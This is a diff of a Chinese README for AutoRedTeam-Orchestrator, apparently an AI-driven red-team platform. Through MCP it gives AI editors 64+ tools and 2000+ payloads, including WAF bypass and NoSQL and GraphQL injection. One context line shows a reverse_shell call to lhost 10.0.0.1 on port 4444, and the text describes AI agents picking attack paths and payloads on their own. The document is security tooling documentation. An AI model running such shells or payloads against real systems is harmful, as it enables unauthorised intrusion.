@@ -4,7 +4,8 @@
   <img src="https://img.shields.io/badge/Platform-Kali%20Linux-557C94?style=for-the-badge&logo=kalilinux&logoColor=white" alt="Kali Linux"/>
   <img src="https://img.shields.io/badge/Python-3.10+-3776AB?style=for-the-badge&logo=python&logoColor=white" alt="Python"/>
   <img src="https://img.shields.io/badge/MCP-Protocol-00ADD8?style=for-the-badge" alt="MCP"/>
-  <img src="https://img.shields.io/badge/Tools-60+-FF6B6B?style=for-the-badge" alt="Tools"/>
+  <img src="https://img.shields.io/badge/Tools-64+-FF6B6B?style=for-the-badge" alt="Tools"/>
+  <img src="https://img.shields.io/badge/Payloads-2000+-orange?style=for-the-badge" alt="Payloads"/>
   <img src="https://img.shields.io/badge/License-MIT-green?style=for-the-badge" alt="License"/>
 </p>
 
@@ -16,7 +17,7 @@
 
 ## 📖 简介
 
-**AutoRedTeam-Orchestrator** 是一个集成了 **60+ 安全工具** 的智能化渗透测试平台。通过 MCP 协议与 AI 编辑器（Windsurf / Cursor / Claude Desktop）无缝集成，实现 **AI 驱动的自动化红队作业**。
+**AutoRedTeam-Orchestrator** 是一个集成了 **64+ 安全工具** 和 **2000+ Payload** 的智能化渗透测试平台。通过 MCP 协议与 AI 编辑器（Windsurf / Cursor / Claude Desktop）无缝集成，实现 **AI 驱动的自动化红队作业**。
 
 只需用自然语言描述目标，AI 就能自动选择工具、执行侦察、发现漏洞、推荐攻击路径。
 
@@ -26,6 +27,8 @@
 - ✅ **AI 原生** - 专为 LLM 设计的工具接口
 - ✅ **全流程覆盖** - 从侦察到漏洞利用完整链路
 - ✅ **实战导向** - 内置 Shiro/Log4j/Fastjson 等实战 Payload
+- ✅ **智能选择** - 根据目标指纹自动选择最优 Payload
+- ✅ **自动编排** - 工具链自动编排，无需手动调用
 
 ---
 
@@ -36,8 +39,9 @@
 | 🤖 **AI 智能驱动** | 基于 LLM 的智能侦察、攻击路径规划、漏洞验证 |
 | 🔍 **全自动侦察** | 一键完成子域名、端口、指纹、WAF、漏洞全流程扫描 |
 | ☢️ **Nuclei 集成** | 11997+ 漏洞检测模板，覆盖最新 CVE |
-| 💉 **Payload 库** | 内置 Shiro/Log4j/Fastjson/SQLi/XSS/RCE 实战 Payload |
-| 🧠 **组件识别** | 自动识别 Web 技术栈并推荐对应 Payload |
+| 💉 **Payload 库** | 2000+ Payload，含 SQLi/XSS/NoSQL/GraphQL/WAF绕过 |
+| 🧠 **智能选择** | 根据目标指纹自动选择最优 Payload |
+| 🔗 **工具链编排** | 自动化工具链，端口扫描→服务识别→漏洞扫描 |
 | 📊 **智能报告** | 自动生成 HTML/Markdown/JSON 格式报告 |
 | 🔗 **MCP 协议** | 原生支持 Windsurf/Cursor/Claude Desktop |
 
@@ -346,7 +350,7 @@ AutoRedTeam-Orchestrator/
 │   ├── ai_engine.py            # AI 引擎集成
 │   ├── attack_chain.py         # 攻击链规划
 │   ├── intelligent_recon_engine.py  # 智能侦察引擎
-│   ├── deep_vuln_scanner.py    # 深度漏扫引擎
+│   ├── tool_chain.py           # 🆕 工具链自动编排
 │   ├── mega_payload_library.py # Payload 库
 │   └── session_manager.py      # 会话管理
 │
@@ -386,7 +390,8 @@ AutoRedTeam-Orchestrator/
 │   │   ├── brute_force.py
 │   │   └── service_tools.py
 │   │
-│   ├── payload_library.py      # Payload 管理
+│   ├── mega_payloads.py        # 🆕 超级Payload库 (2000+)
+│   ├── smart_payload_selector.py  # 🆕 智能Payload选择器
 │   ├── nuclei_integration.py   # Nuclei 集成
 │   └── vuln_verifier.py        # 漏洞验证
 │
@@ -462,15 +467,58 @@ reverse_shell(type="python", lhost="10.0.0.1", lport=4444)
 
 ## 🗺️ 路线图
 
-- [x] 60+ 安全工具集成
+- [x] 64+ 安全工具集成
 - [x] Nuclei 11997+ 模板支持
-- [x] Shiro/Log4j/Fastjson Payload 库
+- [x] 2000+ Payload 库
 - [x] 智能侦察引擎
 - [x] MCP 协议支持
+- [x] 🆕 智能 Payload 选择器
+- [x] 🆕 工具链自动编排
+- [x] 🆕 WAF 绕过 Payload (100+)
+- [x] 🆕 NoSQL/GraphQL/JSON 注入支持
 - [ ] Web UI 界面
 - [ ] 分布式扫描支持
 - [ ] 更多云平台支持 (GCP/Alibaba Cloud)
 - [ ] AI 自动化漏洞利用
+
+---
+
+## 📝 更新日志
+
+### v2.0.0 (2025-01-02)
+
+#### 🆕 新增功能
+- **智能 Payload 选择器** (`modules/smart_payload_selector.py`)
+  - 自动检测 WAF 类型 (Cloudflare/AWS/ModSecurity/Akamai等)
+  - 自动检测数据库类型 (MySQL/MSSQL/PostgreSQL/MongoDB等)
+  - 根据目标指纹自动选择最优 Payload
+  - Payload 成功率统计和排序
+
+- **工具链自动编排** (`core/tool_chain.py`)
+  - 工具依赖图 (DAG) 管理
+  - 条件触发机制 (根据端口自动添加工具)
+  - 异步执行器
+  - 预定义工具链 (web_recon/full_recon/vuln_scan/internal_recon)
+
+- **Payload 库大幅扩展** (`modules/mega_payloads.py`)
+  - WAF 绕过 Payload (100+): Unicode/双重URL/十六进制/注释混淆
+  - NoSQL 注入 (80+): MongoDB/Redis/CouchDB/Elasticsearch
+  - GraphQL 注入 (40+): 内省查询/批量查询/DoS
+  - JSON 注入 (30+): 类型混淆/原型污染/JWT相关
+
+#### 🔧 Bug 修复
+- 修复 `intelligent_recon_engine.py` 中 `self.session` 未定义导致的崩溃
+- 添加外部工具 (subfinder/nmap) 存在性检查
+- 改进错误处理，替换空 `except: pass` 为具体异常类型
+
+#### 📦 文件变更
+- 新增: `modules/smart_payload_selector.py`
+- 新增: `core/tool_chain.py`
+- 修改: `core/intelligent_recon_engine.py`
+- 修改: `modules/mega_payloads.py`
+- 删除: `core/deep_vuln_scanner.py` (功能合并)
+- 删除: `core/full_vuln_scanner.py` (功能合并)
+- 删除: `modules/payload_library.py` (被 mega_payloads.py 替代)
 
 ---
 
